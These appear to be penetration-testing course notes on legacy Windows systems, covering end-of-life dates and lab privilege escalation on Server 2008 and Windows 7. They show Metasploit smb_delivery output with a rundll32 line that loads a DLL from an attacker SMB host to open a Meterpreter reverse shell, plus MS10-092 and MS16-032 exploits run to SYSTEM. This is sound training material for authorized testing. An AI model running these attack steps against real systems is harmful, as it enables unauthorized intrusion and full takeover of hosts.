## 1- Legacy Operating Systems
While this module primarily focuses on modern operating systems (Windows 10/Windows Server 2016), as we have seen, certain issues (i.e., vulnerable software, misconfigurations, careless users, etc.) cannot be solved by merely upgrading to the latest and greatest Windows desktop and server versions. That being said, specific security improvements have been made over the years that no longer affect modern, supported versions of the Windows operating system. During our assessments, we will undoubtedly encounter legacy operating systems (especially against large organizations such as universities, hospitals/medical organizations, insurance companies, utilities, state/local government). It is essential to understand the differences and certain additional flaws that we need to check to ensure our assessments are as thorough as possible.
#### End of Life Systems (EOL)
Over time, Microsoft decides to no longer offer ongoing support for specific operating system versions. When they stop supporting a version of Windows, they stop releasing security updates for the version in question. Windows systems first go into an "extended support" period before being classified as end-of-life or no longer officially supported. Microsoft continues to create security updates for these systems offered to large organizations through custom long-term support contracts. Below is a list of popular Windows versions and their end of life dates:
###### Windows Desktop - EOL Dates by Version

|Version|Date|
|---|---|
|Windows XP|April 8, 2014|
|Windows Vista|April 11, 2017|
|Windows 7|January 14, 2020|
|Windows 8|January 12, 2016|
|Windows 8.1|January 10, 2023|
|Windows 10 release 1507|May 9, 2017|
|Windows 10 release 1703|October 9, 2018|
|Windows 10 release 1809|November 10, 2020|
|Windows 10 release 1903|December 8, 2020|
|Windows 10 release 1909|May 11, 2021|
|Windows 10 release 2004|December 14, 2021|
|Windows 10 release 20H2|May 10, 2022|

###### Windows Server - EOL Dates by Version

|Version|Date|
|---|---|
|Windows Server 2003|April 8, 2014|
|Windows Server 2003 R2|July 14, 2015|
|Windows Server 2008|January 14, 2020|
|Windows Server 2008 R2|January 14, 2020|
|Windows Server 2012|October 10, 2023|
|Windows Server 2012 R2|October 10, 2023|
|Windows Server 2016|January 12, 2027|
|Windows Server 2019|January 9, 2029|
This [page](https://michaelspice.net/windows/end-of-life-microsoft-windows-and-office/) has a more detailed listing of the end-of-life dates for Microsoft Windows and other products such as Exchange, SQL Server, and Microsoft Office, all of which we may run into during our assessments.

#### Impact
When operating systems are set to end of life and are no longer officially supported, there are many issues that may present themselves:

|Issue|Description|
|---|---|
|Lack of support from software companies|Certain applications (such as web browsers and other essential applications) may cease to work once a version of Windows is no longer officially supported.|
|Hardware issues|Newer hardware components will likely stop working on legacy systems.|
|Security flaws|This is the big one with a few notable exceptions (such as [CVE-2020-1350](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-1350) (SIGRed) or EternalBlue ([CVE-2017-0144](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2017-0144))) which were easily exploitable and "wormable" security flaws which affected thousands of systems worldwide (including critical infrastructure such as hospitals). Microsoft will no longer release security updates for end-of-life systems. This could leave the systems open to remote code execution and privilege escalation flaws that will remain unpatched until the system is upgraded or retired.|

In some instances, it is difficult or impossible for an organization to upgrade or retire an end-of-life system due to cost and personnel constraints. The system may be running mission-critical software no longer supported by the original vendor. This is common in medical settings and local government, where the vendor for a critical application goes out of business or no longer provides support for an application, so the organization is stuck running it on a version of Windows XP or even Server 2000/2003. If we discover this during an assessment, it is best to discuss with the client to understand the business reasons why they cannot upgrade or retire the system(s) and suggest solutions such as strict network segmentation to isolate these systems until they can be dealt with appropriately.

As penetration testers, we will often come across legacy operating systems. Though I do not see many hosts running server 2000 or Windows XP workstations vulnerable to [MS08-067](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067), they exist, and I come across them on occasion. It is more common to see a few Server 2003 hosts and 2008 hosts. When we come across these systems, they are often vulnerable to one or multiple remote code execution flaws or local privilege escalation vectors. They can be a great foothold into the environment. However, when attacking them, we should always check with the client to ensure they are not fragile hosts running mission-critical applications that could cause a massive outage. There are several security protections in newer Windows operating system versions that do not exist in legacy versions, making our privilege escalation tasks much more straightforward.

There are some notable differences among older and newer versions of Windows operating system versions. While this module aims to teach local privilege escalation techniques that can be used against modern Windows OS versions, we would be remiss in not going over some of the key differences between the most common versions. The core of the module focuses on various versions of Windows 10, Server 2016, and 2019, but let's take a trip down memory lane and analyze both a Windows 7 and a Server 2008 system from the perspective of a penetration tester with the goal of picking out key differences that are crucial during assessments of large environments.

---
## 2- Windows Server
Windows Server 2008/2008 R2 were made end-of-life on January 14, 2020. Over the years, Microsoft has added enhanced security features to subsequent versions of Windows Server. It is not very common to encounter Server 2008 during an external penetration test, but I often encounter it during internal assessments.

#### Server 2008 vs. Newer Versions
The table below shows some notable differences between Server 2008 and the latest Windows Server versions.

|Feature|Server 2008 R2|Server 2012 R2|Server 2016|Server 2019|
|---|---|---|---|---|
|[Enhanced Windows Defender Advanced Threat Protection (ATP)](https://docs.microsoft.com/en-us/mem/configmgr/protect/deploy-use/defender-advanced-threat-protection)||||X|
|[Just Enough Administration](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1)|Partial|Partial|X|X|
|[Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)|||X|X|
|[Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)|||X|X|
|[Device Guard (code integrity)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419)|||X|X|
|[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)|Partial|X|X|X|
|[Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security)|Partial|Partial|X|X|
|[Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)|||X|X|


### Server 2008 Case Study
Often during my assessments, I come across legacy operating system versions, both Windows and Linux. Sometimes these are merely forgotten systems that the client can quickly act on and decommission, while other times, these can be critical systems that can not be easily removed or replaced. Penetration testers need to understand the client's core business and hold discussions during the assessment, especially when dealing with scanning/enumeration and attacking legacy systems, and during the reporting phase. Not every environment is the same, and we must take many factors into account when writing recommendations for findings and assigning risk ratings. For example, medical settings may be running mission-critical software on Windows XP/7 or Windows Server 2003/2008 systems. Without understanding the reasoning "why," it is not good enough to merely tell them to remove the systems from the environment. If they are running costly MRI software that the vendor no longer supports, it could cost large sums of money to transition to new systems. In this case, we would have to look at other mitigating controls the client has in place, such as network segmentation, custom extended support from Microsoft, etc.

If we are assessing a client with the latest and greatest protections and find one Server 2008 host that was missed, then it may be as simple as recommending to upgrade or decommission. This could also be the case in environments subject to stringent audit/regulatory requirements where a legacy system could get them a "failing" or low score on their audit and even hold up or force them to lose government funding.

Let's take a look at a Windows Server 2008 host that we may uncover in a medical setting, large university, or local government office, among others.

For an older OS like Windows Server 2008, we can use an enumeration script like [Sherlock](https://github.com/rasta-mouse/Sherlock) to look for missing patches. We can also use something like [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), which takes the results of the `systeminfo` command as an input, and compares the patch level of the host against the Microsoft vulnerability database to detect potential missing patches on the target. If an exploit exists in the Metasploit framework for the given missing patch, the tool will suggest it. Other enumeration scripts can assist us with this, or we can even enumerate the patch level manually and perform our own research. This may be necessary if there are limitations in loading tools on the target host or saving command output.

#### Querying Current Patch Level
Let's first use WMI to check for missing KBs.
```powershell
C:\htb> wmic qfe
  # http://support.microsoft.com/?kbid=2533552  WINLPE-2K8  Update                    KB2533552               WINLPE-2K8\Administrator  3/31/2021
```
A quick Google search of the last installed hotfix shows us that this system is very far out of date.
#### Running Sherlock
Let's run Sherlock to gather more information.
```powershell
Set-ExecutionPolicy Bypass -Scope Process
  # Temporarily bypass execution policy for current PowerShell session
  # Required to run unsigned scripts like Sherlock.ps1
  # [Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y

Import-Module .\Sherlock.ps1
  # Load Sherlock privilege escalation enumeration module

Find-AllVulns
  # Enumerate possible local privilege escalation vulnerabilities

  # Title      : User Mode to Ring (KiTrap0D)
  # MSBulletin : MS10-015
  # CVEID      : 2010-0232
  # Link       : https://www.exploit-db.com/exploits/11199/
  # VulnStatus : Not supported on 64-bit systems
  # Comment    : 32-bit only exploit

  # Title      : Task Scheduler .XML
  # MSBulletin : MS10-092
  # CVEID      : 2010-3338, 2010-3888
  # Link       : https://www.exploit-db.com/exploits/19930/
  # VulnStatus : Appears Vulnerable
  # Comment    : Possible privilege escalation via insecure scheduled task XML

  # Title      : NTUserMessageCall Win32k Kernel Pool Overflow
  # MSBulletin : MS13-053
  # CVEID      : 2013-1300
  # Link       : https://www.exploit-db.com/exploits/33213/
  # VulnStatus : Not supported on 64-bit systems
  # Comment    : Kernel exploit limited to x86

  # Title      : TrackPopupMenuEx Win32k NULL Page
  # MSBulletin : MS13-081
  # CVEID      : 2013-3881
  # Link       : https://www.exploit-db.com/exploits/31576/
  # VulnStatus : Not supported on 64-bit systems
  # Comment    : NULL page mapping blocked on x64

  # Title      : TrackPopupMenu Win32k Null Pointer Dereference
  # MSBulletin : MS14-058
  # CVEID      : 2014-4113
  # Link       : https://www.exploit-db.com/exploits/35101/
  # VulnStatus : Not Vulnerable
  # Comment    : Patch applied

  # Title      : ClientCopyImage Win32k
  # MSBulletin : MS15-051
  # CVEID      : 2015-1701, 2015-2433
  # Link       : https://www.exploit-db.com/exploits/37367/
  # VulnStatus : Appears Vulnerable
  # Comment    : High-value kernel privilege escalation candidate

  # Title      : Font Driver Buffer Overflow
  # MSBulletin : MS15-078
  # CVEID      : 2015-2426, 2015-2433
  # Link       : https://www.exploit-db.com/exploits/38222/
  # VulnStatus : Not Vulnerable
  # Comment    : Font driver patched

  # Title      : 'mrxdav.sys' WebDAV
  # MSBulletin : MS16-016
  # CVEID      : 2016-0051
  # Link       : https://www.exploit-db.com/exploits/40085/
  # VulnStatus : Not supported on 64-bit systems
  # Comment    : Legacy 32-bit driver exploit

  # Title      : Secondary Logon Handle
  # MSBulletin : MS16-032
  # CVEID      : 2016-0099
  # Link       : https://www.exploit-db.com/exploits/39719/
  # VulnStatus : Appears Vulnerable
  # Comment    : Token impersonation privilege escalation

  # Title      : Windows Kernel-Mode Drivers EoP
  # MSBulletin : MS16-034
  # CVEID      : 2016-0093/94/95/96
  # Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034
  # VulnStatus : Not Vulnerable
  # Comment    : Kernel drivers updated

  # Title      : Win32k Elevation of Privilege
  # MSBulletin : MS16-135
  # CVEID      : 2016-7255
  # Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
  # VulnStatus : Not Vulnerable
  # Comment    : Mitigated by security patches

  # Title      : Nessus Agent 6.6.2 - 6.10.3
  # MSBulletin : N/A
  # CVEID      : 2017-7199
  # Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
  # VulnStatus : Not Vulnerable
  # Comment    : Installed version not affected
```
#### Obtaining a Meterpreter Shell
From the output, we can see several missing patches. From here, let's get a Metasploit shell back on the system and attempt to escalate privileges using one of the identified CVEs. First, we need to obtain a `Meterpreter` reverse shell. We can do this several ways, but one easy way is using the `smb_delivery` module.
```bash
msf6 exploit(windows/smb/smb_delivery) > search smb_delivery
  # 0  exploit/windows/smb/smb_delivery  2016-07-26       excellent  No     SMB Delivery
use 0
  # [*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/smb_delivery) > show options 

msf6 exploit(windows/smb/smb_delivery) > show options
  # FILE_NAME  test.dll     no   DLL payload name
  # SRVHOST    10.10.14.3   yes  Attacker SMB host
  # SRVPORT    445          yes  SMB service port
  # LHOST      10.10.14.3   yes  Reverse shell IP
  # LPORT      4444         yes  Reverse shell port
  # Exploit target:
  # 1   PSH

show targets
   # 0   DLL
   # 1   PSH
set target 0   # target => 0
exploit 
  # [*] Run the following command on the target machine:
  # rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```
#### Rundll Command on Target Host
Open a cmd console on the target host and paste in the `rundll32.exe` command.
```bash
C:\htb> rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```
#### Receiving Reverse Shell
We get a call back quickly.
```bash
  # msf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.129.43.15
  # [*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.43.15:49609) at 2021-05-12 15:55:05 -0400
```
#### Searching for Local Privilege Escalation Exploit
From here, let's search for the [MS10_092 Windows Task Scheduler '.XML' Privilege Escalation](https://www.exploit-db.com/exploits/19930) module.
```bash
msf6 exploit(windows/smb/smb_delivery) > search 2010-3338
  # 0  exploit/windows/local/ms10_092_schelevator  2010-09-13       excellent  Yes    Windows Escalate Task Scheduler XML Privilege Escalation
use 0
```
#### Migrating to a 64-bit Process
Before using the module in question, we need to hop into our Meterpreter shell and migrate to a 64-bit process, or the exploit will not work. We could have also chosen an x64 Meterpeter payload during the `smb_delivery` step.
```bash
# msf6 post(multi/recon/local_exploit_suggester) > 
sessions -i 1
# meterpreter > 
getpid
  # Current pid: 2268
ps
   # 2796  2632  conhost.exe        x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
   # 2876  476   svchost.exe 
 migrate 2796
  # [*] Migration completed successfully.
background
  # [*] Backgrounding session 1...
```

#### Setting Privilege Escalation Module Options
Once this is set, we can now set up the privilege escalation module by specifying our current Meterpreter session, setting our tun0 IP for the LHOST, and a call-back port of our choosing.
```bash
#  msf6 exploit(windows/local/ms10_092_schelevator) > 
set SESSION 1   # SESSION => 1
set lhost 10.10.14.3
set lport 4443
show options
  #  CMD                        no        Command to execute instead of a payload
  #  SESSION   1                yes       The session to run this module on.

  # Payload options (windows/meterpreter/reverse_tcp):

  # EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   # LHOST     10.10.14.3       yes       The listen address (an interface may be specified)
   # LPORT     4443             yes       The listen port
  # Exploit target:
  # 0   Windows Vista, 7, and 2008
```
#### Receiving Elevated Reverse Shell
If all goes to plan, once we type `exploit`, we will receive a new Meterpreter shell as the `NT AUTHORITY\SYSTEM` account and can move on to perform any necessary post-exploitation.

```bash
exploit
  # [*] Meterpreter session 2 opened (10.10.14.3:4443 -> 10.129.43.15:49634) at 2021-05-12 16:04:34 -0400
# meterpreter > 
getuid # Server username: NT AUTHORITY\SYSTEM
sysinfo # OS              : Windows 2008 R2 (6.1 Build 7600).
```


---
## Windows Desktop Versions
Windows 7 was made end-of-life on January 14, 2020, but is still in use in many environments.

#### Windows 7 vs. Newer Versions
Over the years, Microsoft has added enhanced security features to subsequent versions of Windows Desktop. The table below shows some notable differences between Windows 7 and Windows 10.

|Feature|Windows 7|Windows 10|
|---|---|---|
|[Microsoft Password (MFA)](https://blogs.windows.com/windowsdeveloper/2016/01/26/convenient-two-factor-authentication-with-microsoft-passport-and-windows-hello/)||X|
|[BitLocker](https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview)|Partial|X|
|[Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)||X|
|[Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)||X|
|[Device Guard (code integrity)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419)||X|
|[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)|Partial|X|
|[Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security)|Partial|X|
|[Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)||X|


#### Windows 7 Case Study
To this date, estimates state that there may be over 100 million users still on Windows 7. According to [NetMarketShare](https://www.netmarketshare.com/operating-system-market-share.aspx), as of November 2020, Windows 7 was the second most used desktop operating system after Windows 10. Windows 7 is standard in large companies across the education, retail, transportation, healthcare, financial, government, and manufacturing sectors.

As discussed in the last section, as penetration testers, we must understand our clients' core business, risk appetite, and limitations that may prevent them from entirely moving off all versions of EOL systems such as Windows 7. It is not good enough for us to merely give them a finding for an EOL system with the recommendation of upgrading/decommissioning without any context. We should have ongoing discussions with our clients during our assessments to gain an understanding of their environment. Even if we can attack/escalate privileges on a Windows 7 host, there may be steps that a client can take to limit exposure until they can move off the EOL system(s).

A large retail client may have Windows 7 embedded devices in 100s of their stores running their point of sale (POS) systems. It may not be financially feasible for them to upgrade them all at once, so we may need to work with them to develop solutions to mitigate the risk. A large law firm with one old Windows 7 system may be able to upgrade immediately or even remove it from the network. Context is important.

Let's look at a Windows 7 host that we may uncover in one of the sectors mentioned above. For our Windows 7 target, we can use `Sherlock` again like in the Server 2008 example, but let's take a look at [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester).

###### Install Python Dependencies (local VM only)
To make the tool work in our Pwnbox, we must use the `pyenv` command to manage the Python versions and switch to Python 2.7, which the tool supports. We will not cover the installation of `pyenv`, as it is preinstalled; however, the installation steps are outlined in the [GitHub repository](https://github.com/pyenv/pyenv). We proceed to install the dependencies as follows:
```bash
pyenv shell 2.7
wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
tar -xf setuptools-2.0.tar.gz
cd setuptools-2.0/
python2.7 setup.py install

wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
tar -xf xlrd-1.0.0.tar.gz
cd xlrd-1.0.0/
python2.7 setup.py install
```
###### Gathering Systeminfo Command Output
Once this is done, we need to capture the `systeminfo` command's output and save it to a text file on our attack VM.
```cmd
systeminfo > win7lpe-systeminfo.txt
```
###### Updating the Local Microsoft Vulnerability Database
We then need to update our local copy of the Microsoft Vulnerability database. This command will save the contents to a local Excel file.
```shell-session
python2.7 windows-exploit-suggester.py --update
```
###### Running Windows Exploit Suggester
Once this is done, we can run the tool against the vulnerability database to check for potential privilege escalation flaws.
```bash
python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 
  # [E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
```
Suppose we have obtained a Meterpreter shell on our target using the Metasploit framework. In that case, we can also use this [local exploit suggester module](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/) which will help us quickly find any potential privilege escalation vectors and run them within Metasploit should any module exist.

Looking through the results, we can see a rather extensive list, some Metasploit modules, and some standalone PoC exploits. We must filter through the noise, remove any Denial of Service exploits, and exploits that do not make sense for our target OS. One that stands out immediately as interesting is MS16-032. A detailed explanation of this bug can be found in this [Project Zero blog post](https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html) which is a bug in the Secondary Logon Service.

###### Exploiting MS16-032 with PowerShell PoC
Let's use a [PowerShell PoC](https://www.exploit-db.com/exploits/39719) to attempt to exploit this and elevate our privileges.
```powershell
Set-ExecutionPolicy bypass -scope process
 # [Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
  # [!] Holy handle leak Batman, we have a SYSTEM shell!!
```
###### Spawning a SYSTEM Console
This works and we spawn a SYSTEM cmd console.
```powershell
C:\htb> whoami # nt authority\system
```